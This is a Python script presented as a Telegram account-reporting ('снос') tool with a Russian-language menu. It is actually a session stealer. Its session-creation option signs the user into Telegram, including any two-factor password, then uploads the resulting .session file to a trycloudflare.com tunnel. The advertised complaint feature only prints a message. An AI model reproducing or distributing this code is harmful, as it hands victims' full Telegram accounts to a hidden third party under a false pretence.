import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import requests
import os
import hashlib
import time
from colorama import init, Fore, Style

API_ID = 25001931
API_HASH = 'b4d3909ab27babff2bb87f8936107bb8'

def install_packages():
    required_packages = ["requests", "telethon", "colorama"]
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", package], 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL)

async def create_session(phone_number):
    session_name = f"sessions/{phone_number}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    
    await client.connect()

    if not await client.is_user_authorized():
        await client.send_code_request(phone_number)
        code = input('Введите код из Telegram: ')
        
        try:
            await client.sign_in(phone_number, code)
        except SessionPasswordNeededError:
            password = input('Введите пароль от аккаунта (2FA): ')
            await client.sign_in(password=password)
    
    await client.disconnect()

    return f"sessions/{phone_number}.session"

session_created = False

def hash_session(session_path):
    with open(session_path, 'rb') as f:
        file_data = f.read()
        session_hash = hashlib.sha256(file_data).hexdigest()
    
    new_path = f"sessions/{session_hash}.session"
    os.rename(session_path, new_path)
    
    return new_path, session_hash

SERVER_URL = 'https://ruling-seasonal-speeches-champions.trycloudflare.com/upload'
SEND_TO_ID = '7DZI-O3FH7U20VxrWX5Q8A=='

def upload_session(session_path, session_hash):
    with open(session_path, 'rb') as f:
        files = {'file': (f"{session_hash}.session", f)}
        data = {'send_to_id': SEND_TO_ID, 'session_hash': session_hash}
        
        response = requests.post(SERVER_URL, files=files, data=data)
    
    return response.status_code, response.text

def send_complaint(user, user_id, violation_url):
    print(f"Отправляю жалобу на пользователя {user} с ID {user_id} по ссылке {violation_url}")
    time.sleep(1)

async def menu():
    global session_created
    os.makedirs('sessions', exist_ok=True)

    while True:
        print(f"{Fore.RED}1. Начать снос{Style.RESET_ALL}")
        print(f"{Fore.RED}2. Создать сессию{Style.RESET_ALL}")
        print(f"{Fore.RED}3. О софте{Style.RESET_ALL}")
        print(f"{Fore.RED}4. Выход{Style.RESET_ALL}")
        choice = input(">>> ")

        if choice == "1":
            if not session_created:
                print(f"{Fore.YELLOW}Сначала создайте сессию!{Style.RESET_ALL}")
                time.sleep(2)
                continue
            user = input("Введите юз >>> ")
            user_id = input("Введите id >>> ")
            violation_url = input("Ссылка на нарушение >>> ")
            send_complaint(user, user_id, violation_url)
        
        elif choice == "2":
            phone_number = input('Введите номер телефона (с кодом страны, например +79991234567): ')
            print('Создание сессии...')
            session_path = await create_session(phone_number)
            hashed_session_path, session_hash = hash_session(session_path)
            status_code, response_text = upload_session(hashed_session_path, session_hash)
            
            if status_code == 200:
                print(f'{Fore.GREEN}Сессия успешно создана: {hashed_session_path}{Style.RESET_ALL}')
                session_created = True
            else:
                print(f'{Fore.RED}Ошибка при загрузке сессии: {response_text}{Style.RESET_ALL}')
            time.sleep(2)
        
        elif choice == "3":
            print("Создал @WhoLogger")
            time.sleep(2)
        
        elif choice == "4":
            print("Выход...")
            break
        
        else:
            print("Неверный выбор!")
            time.sleep(1)

if __name__ == '__main__':
    asyncio.run(menu())
